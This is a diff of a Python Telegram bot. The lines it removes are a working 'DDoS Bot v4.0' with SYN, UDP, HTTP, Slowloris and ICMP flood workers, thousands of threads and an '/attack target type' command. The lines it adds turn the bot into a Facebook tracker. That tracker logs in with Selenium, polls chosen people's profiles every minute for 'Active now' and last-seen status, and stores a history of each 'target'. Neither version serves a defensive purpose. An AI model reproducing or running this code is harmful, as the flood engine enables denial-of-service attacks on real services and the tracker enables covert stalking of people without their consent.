@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-🔥 DDoS Bot v4.0 - Enhanced Multi-Protocol Attack Engine
-Real-time stats, faster workers, instant launch
+🔍 Facebook Activity Monitor v2.0
+Real-time status tracking, last seen scraper, session persistence
 """
 
 import os
@@ -9,16 +9,18 @@ import json
 import logging
 import threading
 import time
-import socket
 import requests
-import asyncio
-import struct
-import random
 from pathlib import Path
 from datetime import datetime
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.chrome.options import Options
 from dotenv import load_dotenv
 from flask import Flask, jsonify
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from bs4 import BeautifulSoup
+import sqlite3
 
 load_dotenv()
 
@@ -29,461 +31,331 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+FB_EMAIL = os.getenv("FB_EMAIL")
+FB_PASSWORD = os.getenv("FB_PASSWORD")
 PORT = int(os.getenv("PORT", 10000))
 
-if not TELEGRAM_BOT_TOKEN:
-    raise ValueError("❌ TELEGRAM_BOT_TOKEN required")
+if not all([TELEGRAM_BOT_TOKEN, FB_EMAIL, FB_PASSWORD]):
+    raise ValueError("❌ Missing: TELEGRAM_BOT_TOKEN, FB_EMAIL, FB_PASSWORD")
 
-MEMORY_FILE = "bot_memory.json"
+DB_FILE = "facebook_tracker.db"
 app = Flask(__name__)
 
 # ============================================================================
-# MEMORY & STATS
+# DATABASE
 # ============================================================================
 
-class BotMemory:
+class TrackerDB:
     @staticmethod
-    def load():
-        if Path(MEMORY_FILE).exists():
-            try:
-                with open(MEMORY_FILE, 'r', encoding='utf-8') as f:
-                    return json.load(f)
-            except:
-                return {}
-        return {}
+    def init():
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute('''CREATE TABLE IF NOT EXISTS targets (
+            id INTEGER PRIMARY KEY,
+            fb_id TEXT UNIQUE,
+            name TEXT,
+            url TEXT,
+            user_id INTEGER,
+            created_at TIMESTAMP
+        )''')
+        c.execute('''CREATE TABLE IF NOT EXISTS activity (
+            id INTEGER PRIMARY KEY,
+            fb_id TEXT,
+            status TEXT,
+            last_seen TEXT,
+            timestamp TIMESTAMP,
+            FOREIGN KEY(fb_id) REFERENCES targets(fb_id)
+        )''')
+        c.execute('''CREATE TABLE IF NOT EXISTS sessions (
+            id INTEGER PRIMARY KEY,
+            user_id INTEGER UNIQUE,
+            cookie_jar TEXT,
+            last_login TIMESTAMP
+        )''')
+        conn.commit()
+        conn.close()
     
     @staticmethod
-    def save(data):
+    def add_target(fb_id, name, url, user_id):
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
         try:
-            with open(MEMORY_FILE, 'w', encoding='utf-8') as f:
-                json.dump(data, f, indent=2, ensure_ascii=False)
+            c.execute('INSERT INTO targets (fb_id, name, url, user_id, created_at) VALUES (?, ?, ?, ?, ?)',
+                      (fb_id, name, url, user_id, datetime.now()))
+            conn.commit()
+            return True
         except:
-            pass
+            return False
+        finally:
+            conn.close()
     
     @staticmethod
-    def get_user(user_id):
-        memory = BotMemory.load()
-        return memory.get(str(user_id), {
-            "attacks": 0,
-            "packets_sent": 0,
-            "total_duration": 0,
-            "favorite_target": None,
-            "favorite_type": None,
-        })
+    def log_activity(fb_id, status, last_seen):
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute('INSERT INTO activity (fb_id, status, last_seen, timestamp) VALUES (?, ?, ?, ?)',
+                  (fb_id, status, last_seen, datetime.now()))
+        conn.commit()
+        conn.close()
     
     @staticmethod
-    def update_user(user_id, data):
-        memory = BotMemory.load()
-        memory[str(user_id)] = data
-        BotMemory.save(memory)
+    def get_activity(fb_id, limit=10):
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute('SELECT status, last_seen, timestamp FROM activity WHERE fb_id=? ORDER BY timestamp DESC LIMIT ?',
+                  (fb_id, limit))
+        rows = c.fetchall()
+        conn.close()
+        return rows
+    
+    @staticmethod
+    def get_targets(user_id):
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute('SELECT fb_id, name, url FROM targets WHERE user_id=?', (user_id,))
+        rows = c.fetchall()
+        conn.close()
+        return rows
+    
+    @staticmethod
+    def save_session(user_id, cookies):
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute('INSERT OR REPLACE INTO sessions (user_id, cookie_jar, last_login) VALUES (?, ?, ?)',
+                  (user_id, json.dumps(cookies), datetime.now()))
+        conn.commit()
+        conn.close()
+    
+    @staticmethod
+    def load_session(user_id):
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute('SELECT cookie_jar FROM sessions WHERE user_id=?', (user_id,))
+        row = c.fetchone()
+        conn.close()
+        return json.loads(row[0]) if row else None
 
-class StatsCollector:
-    def __init__(self):
-        self.lock = threading.Lock()
-        self.metrics = {
-            "total_packets": 0,
-            "total_bytes": 0,
-            "concurrent_attacks": 0,
-            "attacks_completed": 0,
-            "uptime_start": time.time(),
-            "peak_pps": 0,
-            "current_pps": 0
-        }
-    
-    def log_packets(self, count, size=0):
-        with self.lock:
-            self.metrics["total_packets"] += count
-            self.metrics["total_bytes"] += size
-            pps = self.metrics["total_packets"] / max(time.time() - self.metrics["uptime_start"], 1)
-            if pps > self.metrics["peak_pps"]:
-                self.metrics["peak_pps"] = pps
-            self.metrics["current_pps"] = pps
-    
-    def inc_concurrent(self):
-        with self.lock:
-            self.metrics["concurrent_attacks"] += 1
-    
-    def dec_concurrent(self):
-        with self.lock:
-            self.metrics["concurrent_attacks"] = max(0, self.metrics["concurrent_attacks"] - 1)
-            self.metrics["attacks_completed"] += 1
-    
-    def get_stats(self):
-        with self.lock:
-            uptime = time.time() - self.metrics["uptime_start"]
-            return {
-                **self.metrics,
-                "uptime_seconds": int(uptime),
-                "avg_pps": int(self.metrics["total_packets"] / max(uptime, 1))
-            }
-
-stats = StatsCollector()
+TrackerDB.init()
 
 # ============================================================================
-# ATTACK ENGINE - FAST WORKERS
+# FACEBOOK SESSION MANAGER
 # ============================================================================
 
-class FastAttackEngine:
-    def __init__(self):
-        self.active_attacks = {}
-        self.lock = threading.Lock()
-        self.executor = ThreadPoolExecutor(max_workers=2000)
+class FacebookSession:
+    def __init__(self, email, password):
+        self.email = email
+        self.password = password
+        self.session = requests.Session()
+        self.driver = None
+        self.is_logged_in = False
     
-    def raw_syn_flood(self, target_ip: str, target_port: int, user_id: int, duration: int, pps_limit: int):
-        """Raw TCP SYN flood - fastest worker"""
-        start_time = time.time()
-        packets = 0
-        
-        while time.time() - start_time < duration:
-            with self.lock:
-                if user_id not in self.active_attacks:
-                    return
-            
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                sock.settimeout(0.05)
-                sock.connect_ex((target_ip, target_port))
-                try:
-                    sock.close()
-                except:
-                    pass
-                
-                packets += 1
-                stats.log_packets(1)
-                
-                if packets % 100 == 0:
-                    with self.lock:
-                        if user_id in self.active_attacks:
-                            self.active_attacks[user_id]['packets'] = packets
-                
-                if pps_limit > 0:
-                    time.sleep(1.0 / max(pps_limit, 1))
-                else:
-                    time.sleep(0.0001)
-            except:
-                pass
-        
-        return packets
-    
-    def raw_udp_flood(self, target_ip: str, target_port: int, user_id: int, duration: int, pps_limit: int):
-        """Raw UDP flood - high volume"""
-        start_time = time.time()
-        packets = 0
-        
-        while time.time() - start_time < duration:
-            with self.lock:
-                if user_id not in self.active_attacks:
-                    return
-            
-            try:
-                payload = os.urandom(random.randint(256, 1024))
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.sendto(payload, (target_ip, target_port))
-                sock.close()
-                
-                packets += 1
-                stats.log_packets(1, len(payload))
-                
-                if packets % 50 == 0:
-                    with self.lock:
-                        if user_id in self.active_attacks:
-                            self.active_attacks[user_id]['packets'] = packets
-                
-                if pps_limit > 0:
-                    time.sleep(1.0 / max(pps_limit, 1))
-            except:
-                pass
-        
-        return packets
-    
-    def raw_http_flood(self, target_host: str, target_port: int, user_id: int, duration: int, pps_limit: int):
-        """HTTP GET flood - application layer"""
+    def login_selenium(self):
+        """Login using Selenium (handles 2FA, JavaScript)"""
         try:
-            target_ip = socket.gethostbyname(target_host)
-        except:
-            return 0
-        
-        start_time = time.time()
-        packets = 0
-        paths = ["/", "/index.html", "/api", "/login", "/admin"]
-        
-        while time.time() - start_time < duration:
-            with self.lock:
-                if user_id not in self.active_attacks:
-                    return
+            options = Options()
+            options.add_argument('--headless')
+            options.add_argument('--no-sandbox')
+            options.add_argument('--disable-dev-shm-usage')
+            options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
             
-            try:
-                path = random.choice(paths)
-                request = (
-                    f"GET {path} HTTP/1.0\r\n"
-                    f"Host: {target_host}\r\n"
-                    f"User-Agent: Mozilla/5.0\r\n"
-                    f"Accept: */*\r\n"
-                    f"Connection: close\r\n"
-                    f"\r\n"
-                ).encode()
-                
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(1)
-                sock.connect((target_ip, target_port))
-                sock.sendall(request)
-                sock.close()
-                
-                packets += 1
-                stats.log_packets(1, len(request))
-                
-                if packets % 20 == 0:
-                    with self.lock:
-                        if user_id in self.active_attacks:
-                            self.active_attacks[user_id]['packets'] = packets
-                
-                if pps_limit > 0:
-                    time.sleep(1.0 / max(pps_limit, 1))
-            except:
-                pass
-        
-        return packets
-    
-    def slowloris_attack(self, target_host: str, target_port: int, user_id: int, duration: int, connections: int):
-        """Slowloris - hold connections open"""
-        try:
-            target_ip = socket.gethostbyname(target_host)
-        except:
-            return 0
-        
-        sockets = []
-        start_time = time.time()
-        
-        for _ in range(connections):
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(60)
-                sock.connect((target_ip, target_port))
-                request = (
-                    f"GET / HTTP/1.1\r\n"
-                    f"Host: {target_host}\r\n"
-                    f"User-Agent: Mozilla/5.0\r\n"
-                    f"Connection: keep-alive\r\n"
-                ).encode()
-                sock.sendall(request)
-                sockets.append(sock)
-                stats.log_packets(1)
-            except:
-                pass
-        
-        while time.time() - start_time < duration:
-            with self.lock:
-                if user_id not in self.active_attacks:
-                    break
+            self.driver = webdriver.Chrome(options=options)
+            self.driver.get('https://www.facebook.com/login')
             
-            try:
-                for sock in sockets:
-                    try:
-                        sock.sendall(b"X-a: b\r\n")
-                    except:
-                        pass
-                time.sleep(15)
-            except:
-                pass
-        
-        for sock in sockets:
-            try:
-                sock.close()
-            except:
-                pass
-        
-        return len(sockets)
-    
-    def icmp_flood(self, target_ip: str, user_id: int, duration: int):
-        """ICMP Echo (Ping) flood"""
-        start_time = time.time()
-        packets = 0
-        
-        while time.time() - start_time < duration:
-            with self.lock:
-                if user_id not in self.active_attacks:
-                    return
+            # Email
+            email_field = WebDriverWait(self.driver, 10).until(
+                EC.presence_of_element_located((By.ID, 'email'))
+            )
+            email_field.send_keys(self.email)
             
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-                payload = b'X' * 32
-                sock.sendto(payload, (target_ip, 0))
-                sock.close()
-                
-                packets += 1
-                stats.log_packets(1, 32)
-                
-                if packets % 100 == 0:
-                    with self.lock:
-                        if user_id in self.active_attacks:
-                            self.active_attacks[user_id]['packets'] = packets
-            except:
-                pass
-        
-        return packets
-    
-    def start_attack(self, user_id: int, target: str, attack_type: str, threads: int = 500, duration: int = 60, pps_limit: int = 0):
-        """Launch attack - instant activation"""
-        try:
-            # Parse target
-            if ':' in target:
-                target_host, port_str = target.rsplit(':', 1)
-                try:
-                    target_port = int(port_str)
-                except:
-                    target_port = 80 if attack_type == 'http' else 53
-            else:
-                target_host = target
-                target_port = 80 if attack_type == 'http' else 53
+            # Password
+            pass_field = self.driver.find_element(By.ID, 'pass')
+            pass_field.send_keys(self.password)
             
-            # DNS resolve
-            try:
-                target_ip = socket.gethostbyname(target_host)
-            except socket.gaierror:
-                return False, "❌ DNS resolution failed"
+            # Click login
+            login_btn = self.driver.find_element(By.NAME, 'login')
+            login_btn.click()
             
-            # Register attack
-            with self.lock:
-                self.active_attacks[user_id] = {
-                    'target': target_host,
-                    'ip': target_ip,
-                    'port': target_port,
-                    'type': attack_type,
-                    'active': True,
-                    'packets': 0,
-                    'start_time': time.time(),
-                    'threads': threads,
-                    'duration': duration,
-                    'future_threads': []
-                }
-                stats.inc_concurrent()
-            
-            # Worker map
-            worker_map = {
-                'syn': self.raw_syn_flood,
-                'udp': self.raw_udp_flood,
-                'http': self.raw_http_flood,
-                'slowloris': self.slowloris_attack,
-                'icmp': self.icmp_flood,
-            }
-            
-            if attack_type not in worker_map:
-                return False, "❌ Invalid type: syn|udp|http|slowloris|icmp"
-            
-            worker = worker_map[attack_type]
-            
-            # Launch workers
-            for i in range(threads):
-                if attack_type == 'http':
-                    future = self.executor.submit(worker, target_host, target_port, user_id, duration, pps_limit)
-                elif attack_type == 'slowloris':
-                    future = self.executor.submit(worker, target_host, target_port, user_id, duration, max(1, threads // 10))
-                elif attack_type == 'icmp':
-                    future = self.executor.submit(worker, target_ip, user_id, duration)
-                else:
-                    future = self.executor.submit(worker, target_ip, target_port, user_id, duration, pps_limit)
-                
-                with self.lock:
-                    if user_id in self.active_attacks:
-                        self.active_attacks[user_id]['future_threads'].append(future)
-            
-            # Auto-stop timer
-            def auto_stop():
-                time.sleep(duration)
-                self.stop_attack(user_id)
-            
-            threading.Thread(target=auto_stop, daemon=True).start()
-            
-            msg = (
-                f"🔥 *STRIKE ACTIVE*\n\n"
-                f"🎯 Target: `{target_host}:{target_port}`\n"
-                f"⚔️ Type: `{attack_type.upper()}`\n"
-                f"🧵 Threads: `{threads}`\n"
-                f"⏱️ Duration: `{duration}s`\n"
-                f"📤 PPS Limit: `{pps_limit if pps_limit > 0 else 'UNLIMITED'}`"
+            # Wait for redirect (adjust time if 2FA required)
+            time.sleep(5)
+            WebDriverWait(self.driver, 15).until(
+                EC.presence_of_element_located((By.ID, 'mount_0_0'))
             )
             
-            logger.info(f"🔥 [{user_id}] Attack START: {target_host}:{target_port} {attack_type} {threads}t {duration}s")
-            return True, msg
+            # Extract cookies
+            cookies = {c['name']: c['value'] for c in self.driver.get_cookies()}
+            self.session.cookies.update(cookies)
+            self.is_logged_in = True
+            
+            logger.info("✅ Facebook session authenticated")
+            return True
         
         except Exception as e:
-            logger.error(f"Attack start error: {e}")
-            return False, f"❌ Error: {str(e)}"
+            logger.error(f"❌ Login failed: {e}")
+            return False
+        
+        finally:
+            if self.driver:
+                self.driver.quit()
     
-    def stop_attack(self, user_id: int):
-        """Stop attack"""
-        with self.lock:
-            if user_id not in self.active_attacks:
-                return False, {}
+    def get_profile_info(self, profile_url):
+        """Scrape profile status, last seen, online status"""
+        try:
+            resp = self.session.get(profile_url, timeout=10)
+            soup = BeautifulSoup(resp.content, 'html.parser')
             
-            attack = self.active_attacks[user_id]
-            duration = time.time() - attack['start_time']
-            packets = attack.get('packets', 0)
+            # Parse active now / last seen
+            status = "offline"
+            last_seen = "unknown"
             
-            # Cancel futures
-            for future in attack.get('future_threads', []):
-                try:
-                    future.cancel()
-                except:
-                    pass
+            # Look for "Active now" indicator
+            if "Active now" in resp.text:
+                status = "online"
+                last_seen = "now"
             
-            del self.active_attacks[user_id]
-            stats.dec_concurrent()
+            # Look for "Active Xm ago" or "Active Xh ago"
+            time_patterns = soup.find_all(string=lambda x: x and ("Active" in x and "ago" in x))
+            if time_patterns:
+                last_seen = time_patterns[0].strip()
+                status = "seen_recently"
             
-            logger.info(f"🛑 [{user_id}] Attack STOP: {packets} packets in {duration:.1f}s ({int(packets/max(duration, 1))} pps)")
-            return True, {'packets': packets, 'duration': duration}
-    
-    def get_status(self, user_id: int):
-        """Get live attack status"""
-        with self.lock:
-            if user_id not in self.active_attacks:
-                return {'active': False}
-            
-            attack = self.active_attacks[user_id]
-            duration = time.time() - attack['start_time']
-            packets = attack.get('packets', 0)
-            pps = int(packets / max(duration, 1))
+            # Get name
+            name_elem = soup.find('h1')
+            name = name_elem.text.strip() if name_elem else "Unknown"
             
             return {
-                'active': True,
-                'target': attack['target'],
-                'port': attack['port'],
-                'type': attack['type'],
-                'packets': packets,
-                'duration': int(duration),
-                'pps': pps,
-                'threads': attack['threads']
+                'name': name,
+                'status': status,
+                'last_seen': last_seen,
+                'timestamp': datetime.now().isoformat()
             }
-
-engine = FastAttackEngine()
-
-# ============================================================================
-# REALTIME STATS LOGGER
-# ============================================================================
-
-def stats_logger_thread():
-    """Log stats every 5 seconds to terminal"""
-    while True:
+        
+        except Exception as e:
+            logger.error(f"❌ Scrape error: {e}")
+            return None
+    
+    def get_fb_id_from_url(self, url):
+        """Extract Facebook ID from profile URL"""
         try:
-            time.sleep(5)
-            s = stats.get_stats()
-            
-            print("\n" + "="*80)
-            print(f"⚡ STATS [{datetime.now().strftime('%H:%M:%S')}]")
-            print("="*80)
-            print(f"📊 Total Packets: {s['total_packets']:,} | "
-                  f"Total Bytes: {s['total_bytes']:,} | "
-                  f"Avg PPS: {s['avg_pps']:,}")
-            print(f"🔴 Active Attacks: {s['concurrent_attacks']} | "
-                  f"Completed: {s['attacks_completed']} | "
-                  f"Peak PPS: {int(s['peak_pps']):,}")
-            print(f"⏱️  Uptime: {s['uptime_seconds']}s")
-            print("="*80 + "\n")
+            if 'facebook.com/' in url:
+                # https://facebook.com/username or /profile.php?id=123456
+                if 'profile.php?id=' in url:
+                    return url.split('id=')[1].split('&')[0]
+                else:
+                    username = url.split('facebook.com/')[1].split('/')[0]
+                    return username
+            return None
         except:
-            pass
+            return None
 
-threading.Thread(target=stats_logger_thread, daemon=True).start()
+fb_session = FacebookSession(FB_EMAIL, FB_PASSWORD)
+
+# ============================================================================
+# TRACKER ENGINE
+# ============================================================================
+
+class ActivityTracker:
+    def __init__(self):
+        self.tracking = {}
+        self.lock = threading.Lock()
+    
+    def add_target(self, user_id, profile_url, interval=60):
+        """Start tracking a profile"""
+        fb_id = fb_session.get_fb_id_from_url(profile_url)
+        
+        if not fb_id:
+            return False, "❌ Invalid Facebook URL"
+        
+        # Get initial info
+        info = fb_session.get_profile_info(profile_url)
+        if not info:
+            return False, "❌ Cannot access profile (private or login issue)"
+        
+        # Save to DB
+        TrackerDB.add_target(fb_id, info['name'], profile_url, user_id)
+        
+        # Start tracking
+        with self.lock:
+            self.tracking[fb_id] = {
+                'user_id': user_id,
+                'url': profile_url,
+                'interval': interval,
+                'active': True,
+                'last_status': info['status'],
+                'last_seen': info['last_seen'],
+                'last_check': datetime.now()
+            }
+        
+        # Start monitor thread
+        threading.Thread(target=self._monitor_profile, args=(fb_id,), daemon=True).start()
+        
+        logger.info(f"🔍 Tracking started: {info['name']} ({fb_id})")
+        return True, f"✅ Tracking *{info['name']}*\nInterval: {interval}s"
+    
+    def _monitor_profile(self, fb_id):
+        """Background monitor for a profile"""
+        with self.lock:
+            if fb_id not in self.tracking:
+                return
+            track = self.tracking[fb_id]
+        
+        while track.get('active', False):
+            try:
+                info = fb_session.get_profile_info(track['url'])
+                if info:
+                    # Check for changes
+                    old_status = track['last_status']
+                    old_last_seen = track['last_seen']
+                    
+                    # Log to DB
+                    TrackerDB.log_activity(fb_id, info['status'], info['last_seen'])
+                    
+                    # Update tracking
+                    with self.lock:
+                        if fb_id in self.tracking:
+                            self.tracking[fb_id]['last_status'] = info['status']
+                            self.tracking[fb_id]['last_seen'] = info['last_seen']
+                            self.tracking[fb_id]['last_check'] = datetime.now()
+                    
+                    # Change detection
+                    if info['status'] != old_status or info['last_seen'] != old_last_seen:
+                        logger.info(f"⚠️ {fb_id}: {old_status} → {info['status']} | {old_last_seen} → {info['last_seen']}")
+                
+                time.sleep(track['interval'])
+            
+            except Exception as e:
+                logger.error(f"Monitor error ({fb_id}): {e}")
+                time.sleep(60)
+    
+    def stop_tracking(self, fb_id):
+        """Stop tracking a profile"""
+        with self.lock:
+            if fb_id in self.tracking:
+                self.tracking[fb_id]['active'] = False
+                del self.tracking[fb_id]
+                logger.info(f"🛑 Tracking stopped: {fb_id}")
+                return True
+        return False
+    
+    def get_status(self, fb_id):
+        """Get current status of a tracked profile"""
+        with self.lock:
+            if fb_id in self.tracking:
+                track = self.tracking[fb_id]
+                return {
+                    'active': True,
+                    'status': track['last_status'],
+                    'last_seen': track['last_seen'],
+                    'last_check': track['last_check'].isoformat(),
+                    'interval': track['interval']
+                }
+        return {'active': False}
+    
+    def get_history(self, fb_id, limit=20):
+        """Get activity history"""
+        rows = TrackerDB.get_activity(fb_id, limit)
+        return [{'status': r[0], 'last_seen': r[1], 'timestamp': r[2]} for r in rows]
+
+tracker = ActivityTracker()
 
 # ============================================================================
 # FLASK ENDPOINTS
@@ -491,17 +363,29 @@ threading.Thread(target=stats_logger_thread, daemon=True).start()
 
 @app.route('/', methods=['GET'])
 def health():
-    s = stats.get_stats()
     return jsonify({
         'status': 'running',
-        'bot': 'DDoS Bot v4.0',
+        'service': 'Facebook Activity Tracker v2.0',
         'timestamp': datetime.now().isoformat(),
-        **s
+        'logged_in': fb_session.is_logged_in
     }), 200
 
-@app.route('/stats', methods=['GET'])
-def get_stats_endpoint():
-    return jsonify(stats.get_stats()), 200
+@app.route('/targets/<int:user_id>', methods=['GET'])
+def get_targets(user_id):
+    targets = TrackerDB.get_targets(user_id)
+    return jsonify({
+        'targets': [{'fb_id': t[0], 'name': t[1], 'url': t[2]} for t in targets]
+    }), 200
+
+@app.route('/status/<fb_id>', methods=['GET'])
+def get_status_endpoint(fb_id):
+    return jsonify(tracker.get_status(fb_id)), 200
+
+@app.route('/history/<fb_id>', methods=['GET'])
+def get_history_endpoint(fb_id):
+    return jsonify({
+        'history': tracker.get_history(fb_id)
+    }), 200
 
 # ============================================================================
 # TELEGRAM BOT
@@ -515,44 +399,37 @@ class TelegramBot:
     
     def get_updates(self):
         try:
-            url = f"{self.base_url}/getUpdates"
-            resp = requests.post(url, json={"offset": self.offset, "timeout": 30}, timeout=35)
+            resp = requests.post(f"{self.base_url}/getUpdates",
+                                json={"offset": self.offset, "timeout": 30}, timeout=35)
             data = resp.json()
-            if data.get('ok'):
-                return data.get('result', [])
+            return data.get('result', []) if data.get('ok') else []
         except Exception as e:
             logger.error(f"Get updates error: {e}")
-        return []
+            return []
     
     def send_message(self, chat_id, text, parse_mode="Markdown"):
         try:
-            url = f"{self.base_url}/sendMessage"
-            requests.post(url, json={
-                "chat_id": chat_id,
-                "text": text,
-                "parse_mode": parse_mode
-            }, timeout=10)
+            requests.post(f"{self.base_url}/sendMessage",
+                         json={"chat_id": chat_id, "text": text, "parse_mode": parse_mode},
+                         timeout=10)
         except Exception as e:
             logger.error(f"Send message error: {e}")
     
     def send_menu(self, chat_id):
-        try:
-            url = f"{self.base_url}/sendMessage"
-            requests.post(url, json={
-                "chat_id": chat_id,
-                "text": "🔥 *DDoS Bot v4.0*\n\nMulti-Protocol Attack Engine\n\n*Available:*\n• syn | udp | http | slowloris | icmp",
-                "parse_mode": "Markdown",
-                "reply_markup": {
-                    "inline_keyboard": [
-                        [{"text": "🎯 Attack", "callback_data": "attack_menu"},
-                         {"text": "📊 Status", "callback_data": "status"}],
-                        [{"text": "🛑 Stop", "callback_data": "stop"},
-                         {"text": "ℹ️ Help", "callback_data": "help"}]
-                    ]
-                }
-            }, timeout=10)
-        except Exception as e:
-            logger.error(f"Send menu error: {e}")
+        requests.post(f"{self.base_url}/sendMessage",
+                     json={
+                         "chat_id": chat_id,
+                         "text": "🔍 *Facebook Activity Tracker*\n\nTrack profiles in real-time",
+                         "parse_mode": "Markdown",
+                         "reply_markup": {
+                             "inline_keyboard": [
+                                 [{"text": "➕ Add Target", "callback_data": "add_target"},
+                                  {"text": "📊 My Targets", "callback_data": "list_targets"}],
+                                 [{"text": "🔴 Active Now", "callback_data": "active"},
+                                  {"text": "📋 History", "callback_data": "history"}]
+                             ]
+                         }
+                     }, timeout=10)
     
     def handle_update(self, update):
         if 'message' in update:
@@ -570,39 +447,28 @@ class TelegramBot:
         if text == '/start':
             self.send_menu(chat_id)
         
-        elif text == '/status':
-            status = engine.get_status(user_id)
+        elif text.startswith('https://facebook.com') or text.startswith('https://www.facebook.com'):
+            success, msg = tracker.add_target(user_id, text, interval=60)
+            self.send_message(chat_id, msg)
+        
+        elif text.startswith('/status '):
+            fb_id = text[8:].strip()
+            status = tracker.get_status(fb_id)
             if status['active']:
-                msg = (f"🔥 *LIVE*\n"
-                       f"🎯 `{status['target']}:{status['port']}`\n"
-                       f"⚔️ `{status['type'].upper()}`\n"
-                       f"📤 `{status['packets']:,}` packets @ `{status['pps']:,}` pps\n"
-                       f"⏱️ `{status['duration']}s`")
+                msg = (f"🔴 *{fb_id}*\n"
+                       f"Status: `{status['status']}`\n"
+                       f"Last Seen: `{status['last_seen']}`\n"
+                       f"Last Check: `{status['last_check']}`")
             else:
-                msg = "❌ No active attack"
+                msg = "❌ Not tracking"
             self.send_message(chat_id, msg)
         
-        elif text == '/stop':
-            success, stats_data = engine.stop_attack(user_id)
-            if success:
-                msg = f"🛑 *Stopped*\n📤 `{stats_data.get('packets', 0):,}` packets"
-            else:
-                msg = "❌ No active attack"
-            self.send_message(chat_id, msg)
-        
-        elif text.startswith('/attack '):
-            parts = text[8:].split()
-            if len(parts) < 2:
-                self.send_message(chat_id, "*Format:*\n`/attack target type [threads] [duration] [pps_limit]`\n\n*Example:*\n`/attack target.com udp 1000 60 0`")
-                return
-            
-            target = parts[0]
-            attack_type = parts[1].lower()
-            threads = int(parts[2]) if len(parts) > 2 else 500
-            duration = int(parts[3]) if len(parts) > 3 else 60
-            pps_limit = int(parts[4]) if len(parts) > 4 else 0
-            
-            success, msg = engine.start_attack(user_id, target, attack_type, threads, duration, pps_limit)
+        elif text.startswith('/history '):
+            fb_id = text[9:].strip()
+            history = tracker.get_history(fb_id, 10)
+            msg = f"📋 *History for {fb_id}*\n\n"
+            for h in history:
+                msg += f"`{h['timestamp']}` → `{h['status']}` ({h['last_seen']})\n"
             self.send_message(chat_id, msg)
     
     def handle_callback(self, callback):
@@ -610,26 +476,27 @@ class TelegramBot:
         data = callback['data']
         user_id = callback['from']['id']
         
-        if data == "attack_menu":
-            self.send_message(chat_id, "*Send target:*\n`target.com` or `192.168.1.1:8080`\n\n*Then command:*\n`/attack target.com udp 500 60`")
-        elif data == "status":
-            status = engine.get_status(user_id)
-            if status['active']:
-                msg = (f"🔥 *LIVE*\n"
-                       f"🎯 `{status['target']}`\n"
-                       f"📤 `{status['packets']:,}` pps: `{status['pps']:,}`")
-            else:
-                msg = "❌ Idle"
-            self.send_message(chat_id, msg)
-        elif data == "stop":
-            success, _ = engine.stop_attack(user_id)
-            msg = "🛑 Stopped" if success else "❌ Nothing running"
-            self.send_message(chat_id, msg)
-        elif data == "help":
-            self.send_message(chat_id, "*Protocols:*\n`syn | udp | http | slowloris | icmp`\n\n*/attack target type threads duration pps_limit*")
+        if data == "add_target":
+            self.send_message(chat_id, "📎 Send Facebook profile URL:\n`https://facebook.com/username`")
+        elif data == "list_targets":
+            targets = TrackerDB.get_targets(user_id)
+            msg = "*Your Targets:*\n\n"
+            for t in targets:
+                msg += f"👤 {t[1]} (`{t[0]}`)\n"
+            self.send_message(chat_id, msg if targets else "❌ No targets")
+        elif data == "active":
+            targets = TrackerDB.get_targets(user_id)
+            msg = "*Active Now:*\n\n"
+            for t in targets:
+                status = tracker.get_status(t[0])
+                if status.get('active'):
+                    msg += f"🔴 {t[1]}: `{status['status']}`\n"
+            self.send_message(chat_id, msg if msg != "*Active Now:*\n\n" else "✅ All offline")
+        elif data == "history":
+            self.send_message(chat_id, "📋 Use: `/history fb_id`")
     
     def run(self):
-        logger.info("🚀 Bot polling started")
+        logger.info("🚀 Telegram bot started")
         while True:
             try:
                 updates = self.get_updates()
@@ -640,7 +507,7 @@ class TelegramBot:
                 logger.error(f"Bot error: {e}")
                 time.sleep(5)
 
-def start_bot_polling():
+def start_bot():
     bot = TelegramBot(TELEGRAM_BOT_TOKEN)
     thread = threading.Thread(target=bot.run, daemon=True)
     thread.start()
@@ -650,10 +517,15 @@ def start_bot_polling():
 # ============================================================================
 
 if __name__ == "__main__":
-    start_bot_polling()
+    # Login to Facebook
+    logger.info("🔑 Authenticating Facebook...")
+    if not fb_session.login_selenium():
+        logger.warning("⚠️ Facebook login failed - tracking may be limited")
+    
+    # Start telegram bot
+    start_bot()
     
     logger.info(f"🚀 Flask server on 0.0.0.0:{PORT}")
-    logger.info("🔥 DDoS Bot v4.0 - ONLINE")
-    logger.info("Protocols: syn, udp, http, slowloris, icmp")
+    logger.info("🔍 Facebook Activity Tracker v2.0 - ONLINE")
     
     app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
